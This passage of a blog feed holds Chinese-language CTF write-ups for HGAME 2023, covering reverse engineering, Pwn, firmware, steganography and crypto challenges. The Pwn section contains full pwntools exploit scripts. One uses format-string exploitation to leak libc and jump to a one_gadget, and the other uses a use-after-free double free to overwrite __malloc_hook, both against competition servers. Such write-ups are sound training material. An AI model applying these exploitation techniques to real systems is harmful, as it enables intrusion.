class="number">457511012</span>), UInt.m387boximpl(-<span class="number">2038734351</span>), UInt.m387boximpl(<span class="number">578827205</span>), UInt.m387boximpl(-<span class="number">245529892</span>), UInt.m387boximpl(-<span class="number">1652281167</span>), UInt.m387boximpl(<span class="number">435335655</span>), UInt.m387boximpl(<span class="number">733644188</span>), UInt.m387boximpl(<span class="number">705177885</span>), UInt.m387boximpl(-<span class="number">596608744</span>)&#125;;</span><br><span class="line"><span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> i2 + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (uIntArr[i2].m444unboximpl() != UIntArray.m452getpVg5ArA(m229encrypthkIa6DI, i2)) &#123;</span><br><span class="line">Toast.makeText(<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;序列号不正确&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (i3 &gt; <span class="number">9</span>) &#123;</span><br><span class="line">alertDialog.dismiss();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">i2 = i3;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>魔改XTEA加密，修改了delta、异或操作和加密顺次，解密脚本在相应地方修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x34566543</span></span><br><span class="line">    x = delta * <span class="number">33</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>]) ^ x</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line">    </span><br><span class="line">c = [<span class="number">0x260202FA</span>, <span class="number">0x1B451064</span>, <span class="number">0x867B61F1</span>, <span class="number">0x228033C5</span>, <span class="number">0xF15D82DC</span>, <span class="number">0x9D8430B1</span>, <span class="number">0x19F2B1E7</span>, <span class="number">0x2BBA859C</span>, <span class="number">0x2A08291D</span>, <span class="number">0xDC707918</span>]</span><br><span class="line">key = [<span class="number">2233</span>, <span class="number">4455</span>, <span class="number">6677</span>, <span class="number">8899</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)-<span class="number">1</span>):</span><br><span class="line">    d = decrypt(c[-<span class="number">2</span>:], key)</span><br><span class="line">    flag = long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>] + flag</span><br><span class="line">    c = c[:-<span class="number">2</span>] + [d[<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;e&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>补全flag头，flag：<code>hgame&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;</code>。</p><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a>YukkuriSay</h3><blockquote><p>HINTS:</p><p>格式化占位符的值来自于函数的参数，同时64位程序传参不是只用寄存器的哦</p><p>%n占位符是存在溢出的</p></blockquote><p>打格式化字符串，分别泄露栈地址和 <code>__libc_start_main()</code> 地址求得libc基地址，再用one_gadget打即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="number">30687</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)-<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.send(p64(stack_addr)*<span class="number">0x20</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;%45$p%4418c%8$hn&#x27;</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+r.recv(<span class="number">12</span>))-<span class="number">243</span></span><br><span class="line">libc_base = libc_start_main - libc.sym.__libc_start_main</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#r.recvline()</span></span><br><span class="line"></span><br><span class="line">ogg = libc_base+<span class="number">0xe3b01</span></span><br><span class="line">r.recvline()</span><br><span class="line">pl = p64(stack_addr-<span class="number">224</span>+<span class="number">2</span>)+p64(stack_addr-<span class="number">224</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%8$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg&amp;<span class="number">0xffff</span>)-((ogg&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%9$hn&#x27;</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h3><p>libc 2.23 UAF，泄露 <code>__malloc_hook()</code> 地址求得libc基地址，double free后使用 <code>realloc()</code> 调试，使得满足one_gadget条件即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="number">31341</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">ind,size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">ind</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">ind</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)-<span class="number">104</span></span><br><span class="line">libc_base = malloc_hook - libc.sym.__malloc_hook</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">ogg = libc_base + <span class="number">0xf1247</span></span><br><span class="line">realloc = libc_base + libc.sym.realloc</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(ogg)+p64(realloc+<span class="number">0x6</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="string">&#x27;10&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="string">&#x27;20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Iot"><a href="#Iot" class="headerlink" title="Iot"></a>Iot</h2><h3 id="Pirated-router"><a href="#Pirated-router" class="headerlink" title="Pirated router"></a>Pirated router</h3><blockquote><p>兔兔在回家的火车上,看到一个神秘的0tatoP在卖路由器,于是兔兔买了一个回家过年,但是这个路由器咋总感觉怪怪的</p></blockquote><p>路由器bin固件文件，参考<a href="https://iqqoz.com/post-3231.html#gsc.tab=0">提取路由器固件中的squashfs文件系统unsquashfs提取方法</a>，提取路由器固件中的squashfs。</p><p>安装squashfs后，使用binwalk分离bin文件：<code>binwalk -e AC10086W_FW_1.1.4.5.bin</code>，生成文件夹 <code>squashfs-root</code>，其中的squashfs文件，修改文件头为 <code>hsqs</code>。</p><p>利用 <a href="https://github.com/rampageX/firmware-mod-kit.git">firmware-mod-kit</a> 解包squashfs文件：<code>unsquashfs 1.squashfs</code>，在 <code>/bin</code> 目录中发现一个文件名比较特别的程序 <code>secret_program</code>，使用IDA查看逻辑，<code>main()</code> 函数中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _OWORD v4[<span class="number">8</span>]; <span class="comment">// [xsp+10h] [xbp+10h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [xsp+90h] [xbp+90h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [xsp+98h] [xbp+98h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [xsp+9Ch] [xbp+9Ch]</span></span><br><span class="line"></span><br><span class="line">  v4[<span class="number">0</span>] = unk_4543B0;</span><br><span class="line">  v4[<span class="number">1</span>] = unk_4543C0;</span><br><span class="line">  v4[<span class="number">2</span>] = unk_4543D0;</span><br><span class="line">  v4[<span class="number">3</span>] = unk_4543E0;</span><br><span class="line">  v4[<span class="number">4</span>] = unk_4543F0;</span><br><span class="line">  v4[<span class="number">5</span>] = unk_454400;</span><br><span class="line">  v4[<span class="number">6</span>] = unk_454410;</span><br><span class="line">  v4[<span class="number">7</span>] = unk_454420;</span><br><span class="line">  v5 = <span class="number">94</span>;</span><br><span class="line">  v6 = <span class="number">35</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(&amp;unk_4543A8, *((_DWORD *)v4 + i) ^ v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提取数据，简单异或操作还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">75</span>, <span class="number">68</span>, <span class="number">66</span>, <span class="number">78</span>, <span class="number">70</span>, <span class="number">88</span>, <span class="number">86</span>, <span class="number">77</span>, <span class="number">83</span>, <span class="number">23</span>, <span class="number">64</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">124</span>, <span class="number">69</span>, <span class="number">74</span>, <span class="number">81</span>, <span class="number">78</span>, <span class="number">84</span>, <span class="number">66</span>, <span class="number">81</span>, <span class="number">70</span>, <span class="number">124</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">124</span>, <span class="number">16</span>, <span class="number">98</span>, <span class="number">80</span>, <span class="number">90</span>, <span class="number">94</span>]</span><br><span class="line">ss = [k^<span class="number">35</span> <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ss))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;unp4ck1ng_firmware_1s_3Asy&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)&lt;br&gt;线上赛平台：&lt;a href=&quot;https://hgame.vidar.club/&quot;&gt;https://hgame.vidar.club&lt;/a&gt;&lt;br&gt;请尽</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2023 Week 1</title>
    <link href="https://lazzzaro.github.io/2023/01/11/match-HGAME-2023-Week-1/"/>
    <id>https://lazzzaro.github.io/2023/01/11/match-HGAME-2023-Week-1/</id>
    <published>2023-01-11T10:51:02.000Z</published>
    <updated>2023-01-13T10:19:10.014Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)<br>线上赛平台：<a href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭<br>本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址<br>比赛奖金(针对校外榜)：<br>第1名：1000Pwnhub金币<br>第2名：800Pwnhub金币<br>第3名：600Pwnhub金币<br>4-10名：300Pwnhub金币<br>补充说明：排行榜分数相同者，以先达到该分数的时间次序划定排名，每位获奖选手额外赠送 Pwnhub 邀请码一个<br>注意：<br>* 所有选手均以个人为单位参赛；<br>* 在解题过程中遇到瓶颈或困难可以私聊出题人<br>* 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路，对平台、参赛者或其他人员进行攻击。违者分数作废并取消比赛资格。<br>* HGAME 线上赛分为四周，每周至官方wp发布前前禁止一切讨论本周题目以及公开自己 wp 的行为。在收集完成后会开放讨论，但仅能讨论已结束的题目。<br>* 每周比赛结束后本周前20名需提交wp到指定邮箱<br>本比赛最终解释权归 Vidar-Team 所有</p><p><strong>Rank: 1</strong></p><hr><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h3><blockquote><p>欢迎参加HGAME2023,Base64解码这段Flag，然后和兔兔一起开始你的HGAME之旅吧，祝你玩的愉快！</p><p>aGdhbWV7V2VsY29tZV9Ub19IR0FNRTIwMjMhfQ==</p></blockquote><p>签到，base64解码，flag：<code>hgame&#123;Welcome_To_HGAME2023!&#125;</code>。</p><p>​    </p><h3 id="Where-am-I"><a href="#Where-am-I" class="headerlink" title="Where am I"></a>Where am I</h3><blockquote><p>兔兔回家之前去了一个神秘的地方，并拍了张照上传到网盘，你知道他去了哪里吗？</p><p>flag格式为: <code>hgame&#123;经度时_经度分_经度秒_东经(E)/西经(W)_纬度时_纬度分_纬度秒_南纬(S)/北纬(N)&#125;</code>，秒精确到小数点后两位</p><p>例如: 11°22’33.99’’E, 44°55’11.00’’S 表示为 hgame{11_22_3399_E_44_55_1100_S}</p></blockquote><p>wireshark打开流量文件，在TCP流15提取rar文件；</p><p>16进制下查看rar文件，查看第24个16进制数为<code>24</code>，修改为 <code>20</code> 去除伪加密，解压得到 <code>Exchangeable.jpg</code>；</p><p>查看jpg文件属性，发现GPS经纬度信息，提取经纬度数据按格式得到flag：<code>hgame&#123;116_24_1488_E_39_54_5418_N&#125;</code>。</p><p>​    </p><h3 id="神秘的海报"><a href="#神秘的海报" class="headerlink" title="神秘的海报"></a>神秘的海报</h3><blockquote><p>坐车回到家的兔兔听说ek1ng在HGAME的海报中隐藏了一个秘密……（还记得我们的Misc培训吗？</p></blockquote><p>zsteg查看png图片，发现在 <code>b1,rgb,lsb,xy</code> 存在lsb隐写内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Sure enough, you still remember what we talked about at that time! This is part of the secret: `hgame&#123;U_Kn0w_LSB&amp;W`</span><br><span class="line">I put the rest of the content here, https://drive.google.com/file/d/13kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/view?usp=sharing, if you directly access the google drive cloud disk download in China, it will be very slow, you can try to use Scientific Internet access solves the problem of slow or inaccessible access to external network resources. This is my favorite music, there is another part of the secret in the music, I use Steghide to encrypt, the password is also the 6-digit password we agreed at the time, even if someone else finds out here, it should not be so easy to crack (( hope so</span><br></pre></td></tr></table></figure><p>得到flag前半部分 <code>hgame&#123;U_Kn0w_LSB&amp;W</code>。</p><p>到google云盘下载 <code>Bossanova.wav</code> 文件，根据上面文字提示 <code>I use Steghide to encrypt, the password is also the 6-digit password</code>，使用了 <code>Steghide</code> 工具用6位数字密码隐写信息，爆破密码提取信息：</p><p><code>stegseek Bossanova.wav rockyou.txt</code></p><p>解出密码为 <code>123456</code>，隐写内容：<code>恭喜你解到这里，剩下的Flag是 av^Mp3_Stego&#125;，我们Week2见！</code></p><p>flag：<code>hgame&#123;U_Kn0w_LSB&amp;Wav^Mp3_Stego&#125;</code></p><p>​    </p><h3 id="e99p1ant-want-girlfriend"><a href="#e99p1ant-want-girlfriend" class="headerlink" title="e99p1ant_want_girlfriend"></a>e99p1ant_want_girlfriend</h3><blockquote><p>兔兔在抢票网站上看到了一则相亲广告，人还有点小帅，但这个图片似乎有点问题，好像是CRC校验不太正确？</p></blockquote><p>16进制下修改png图片的高为更大的值，发现flag：<code>hgame&#123;e99p1ant_want_a_girlfriend_qq_524306184&#125;</code>。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="兔兔的车票"><a href="#兔兔的车票" class="headerlink" title="兔兔的车票"></a>兔兔的车票</h3><blockquote><p>兔兔刚买到车票就把车票丢到一旁，自己忙去了。结果再去找车票时发现原来的车票混在了其他东西里，而且票面还被污染了。你能帮兔兔找到它的车票吗。</p><p>注：flag.png已经提前保存在source文件夹下，并且命名为picture{x}.png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randint, getrandbits</span><br><span class="line"></span><br><span class="line">flagImg = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">width = flagImg.width</span><br><span class="line">height = flagImg.height</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeSourceImg</span>():</span><br><span class="line">    colors = long_to_bytes(getrandbits(width * height * <span class="number">24</span>))[::-<span class="number">1</span>]</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            img.putpixel((j, i), (colors[x], colors[x + <span class="number">1</span>], colors[x + <span class="number">2</span>]))</span><br><span class="line">            x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">source文件夹下面的图片生成过程：</span></span><br><span class="line"><span class="string">def makeImg():</span></span><br><span class="line"><span class="string">    colors = list(long_to_bytes(getrandbits(width * height * 23)).zfill(width * height * 24))</span></span><br><span class="line"><span class="string">    shuffle(colors)</span></span><br><span class="line"><span class="string">    colors = bytes(colors)</span></span><br><span class="line"><span class="string">    img = Image.new(&#x27;RGB&#x27;, (width, 